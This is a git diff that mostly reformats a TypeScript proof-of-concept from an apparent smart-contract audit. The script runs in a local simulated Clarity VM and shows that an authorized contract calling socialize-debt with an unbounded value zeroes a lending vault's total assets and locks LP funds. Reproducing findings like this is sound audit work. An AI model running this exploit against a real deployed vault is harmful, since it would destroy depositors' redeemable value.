@@ -9,11 +9,12 @@
  * Stack: @stacks/clarinet-sdk (wasm Clarity VM) + @secondlayer/stacks/clarity (Cl).
  * Run:   bun run simnet/poc/finding-1.ts   (from apps/audit-sentinel)
  */
-import { initSimnet } from "@stacks/clarinet-sdk";
-import { Cl } from "@secondlayer/stacks/clarity";
+
 import { readFileSync } from "node:fs";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
+import { Cl } from "@secondlayer/stacks/clarity";
+import { initSimnet } from "@stacks/clarinet-sdk";
 
 const here = dirname(fileURLToPath(import.meta.url));
 const simnetRoot = join(here, "..");
@@ -52,10 +53,17 @@ async function main() {
   const pub = (fn: string, args: any[], sender: string) =>
     simnet.callPublicFn("vault", fn, args, sender).result;
   const ro = (fn: string, args: any[]) => simnet.callReadOnlyFn("vault", fn, args, deployer).result;
-  const mint = (amt: bigint, who: string) =>
-    simnet.callPublicFn("sbtc-token", "mint", [Cl.uint(amt), Cl.principal(who)], deployer).result;
-  const sbtcBal = (who: string) =>
-    uintOf(simnet.callReadOnlyFn("sbtc-token", "get-balance", [Cl.principal(who)], deployer).result);
+  // `@secondlayer/stacks` Cl values are wire-compatible with clarinet-sdk's
+  // `@stacks/transactions` ClarityValue but declared as distinct nominal types;
+  // route args through `any[]` (same convention as `pub`/`ro` above).
+  const mint = (amt: bigint, who: string) => {
+    const args: any[] = [Cl.uint(amt), Cl.principal(who)];
+    return simnet.callPublicFn("sbtc-token", "mint", args, deployer).result;
+  };
+  const sbtcBal = (who: string) => {
+    const args: any[] = [Cl.principal(who)];
+    return uintOf(simnet.callReadOnlyFn("sbtc-token", "get-balance", args, deployer).result);
+  };
 
   const CAP = 100_000_000_000_000n; // 1e14
   const A = 100_000_000n; // LP deposits 1.0 sBTC (1e8 sats)
@@ -69,39 +77,64 @@ async function main() {
   ok(pub("set-cap-debt", [Cl.uint(CAP)], deployer).type === "ok", "dao set-cap-debt");
   ok(pub("set-fee-reserve", [Cl.uint(1000n)], deployer).type === "ok", "dao set-fee-reserve (10%)");
   ok(pub("initialize", [], deployer).type === "ok", "vault initialized (MINIMUM-LIQUIDITY seeded)");
-  ok(uintOf(pub("deposit", [Cl.uint(A), Cl.uint(0n), Cl.principal(lp)], lp)) === A, "LP deposits 1.0 sBTC -> A shares");
+  ok(
+    uintOf(pub("deposit", [Cl.uint(A), Cl.uint(0n), Cl.principal(lp)], lp)) === A,
+    "LP deposits 1.0 sBTC -> A shares",
+  );
 
   // create active lending state (precondition for the bug)
-  ok(pub("set-authorized-contract", [Cl.principal(controller), Cl.bool(true)], deployer).type === "ok", "dao authorizes borrow controller");
-  ok(pub("system-borrow", [Cl.uint(B), Cl.principal(controller)], controller).type === "ok", "controller borrows 0.5 sBTC (debt now active)");
+  ok(
+    pub("set-authorized-contract", [Cl.principal(controller), Cl.bool(true)], deployer).type ===
+      "ok",
+    "dao authorizes borrow controller",
+  );
+  ok(
+    pub("system-borrow", [Cl.uint(B), Cl.principal(controller)], controller).type === "ok",
+    "controller borrows 0.5 sBTC (debt now active)",
+  );
   const psBefore = uintOf(ro("get-principal-scaled", []));
 
   console.log("\n=== PRE-ATTACK STATE (healthy vault) ===");
   const taBefore = uintOf(ro("get-total-assets", []));
   const lpRedeemable = uintOf(ro("convert-to-assets", [Cl.uint(A)]));
   const lpShares = uintOf(ro("get-balance", [Cl.principal(lp)]));
-  console.log(`  total-assets=${taBefore}  LP shares=${lpShares}  LP redeemable=${lpRedeemable}  vault sBTC=${sbtcBal(vaultId)}`);
+  console.log(
+    `  total-assets=${taBefore}  LP shares=${lpShares}  LP redeemable=${lpRedeemable}  vault sBTC=${sbtcBal(vaultId)}`,
+  );
   ok(taBefore > 0n, "vault has assets");
   ok(lpRedeemable === A, "LP can redeem ~1.0 sBTC (full value)");
 
   console.log("\n=== ATTACK: one authorized contract calls socialize-debt ===");
-  ok(pub("set-authorized-contract", [Cl.principal(evil), Cl.bool(true)], deployer).type === "ok", "dao authorizes EVIL contract");
+  ok(
+    pub("set-authorized-contract", [Cl.principal(evil), Cl.bool(true)], deployer).type === "ok",
+    "dao authorizes EVIL contract",
+  );
   const scaled = psBefore * 1_000_000n; // unbounded: no bad-debt precondition, no cap
   console.log(`  EVIL calls (socialize-debt u${scaled})  [principal-scaled was ${psBefore}]`);
-  ok(pub("socialize-debt", [Cl.uint(scaled)], evil).type === "ok", "socialize-debt SUCCEEDS (no revert, no precondition)");
+  ok(
+    pub("socialize-debt", [Cl.uint(scaled)], evil).type === "ok",
+    "socialize-debt SUCCEEDS (no revert, no precondition)",
+  );
 
   console.log("\n=== POST-ATTACK STATE (LP value destroyed) ===");
   const taAfter = uintOf(ro("get-total-assets", []));
   const lpRedeemableAfter = uintOf(ro("convert-to-assets", [Cl.uint(A)]));
-  console.log(`  total-assets=${taAfter}  assets=${uintOf(ro("get-assets", []))}  principal-scaled=${uintOf(ro("get-principal-scaled", []))}  lindex=${uintOf(ro("get-lindex", []))}`);
-  console.log(`  LP redeemable=${lpRedeemableAfter}  vault still physically holds sBTC=${sbtcBal(vaultId)}`);
+  console.log(
+    `  total-assets=${taAfter}  assets=${uintOf(ro("get-assets", []))}  principal-scaled=${uintOf(ro("get-principal-scaled", []))}  lindex=${uintOf(ro("get-lindex", []))}`,
+  );
+  console.log(
+    `  LP redeemable=${lpRedeemableAfter}  vault still physically holds sBTC=${sbtcBal(vaultId)}`,
+  );
   ok(taAfter === 0n, "total-assets driven to ZERO");
   ok(lpRedeemableAfter === 0n, "LP redeemable value is now ZERO");
 
   console.log("\n=== PROOF: LP withdrawal is bricked, funds locked ===");
   const redeemRes = pub("redeem", [Cl.uint(A), Cl.uint(0n), Cl.principal(lp)], lp);
   ok(isErr(redeemRes, 801012n), "LP redeem() REVERTS with ERR-OUTPUT-ZERO (u801012)");
-  ok(sbtcBal(vaultId) > 0n, `vault still holds ${sbtcBal(vaultId)} sats that no LP can ever withdraw`);
+  ok(
+    sbtcBal(vaultId) > 0n,
+    `vault still holds ${sbtcBal(vaultId)} sats that no LP can ever withdraw`,
+  );
 
   console.log(`\n✅ FINDING 1 REPRODUCED — ${checks} assertions passed.`);
   console.log("   One authorized-contract call destroyed 100% of LP redemption value;");
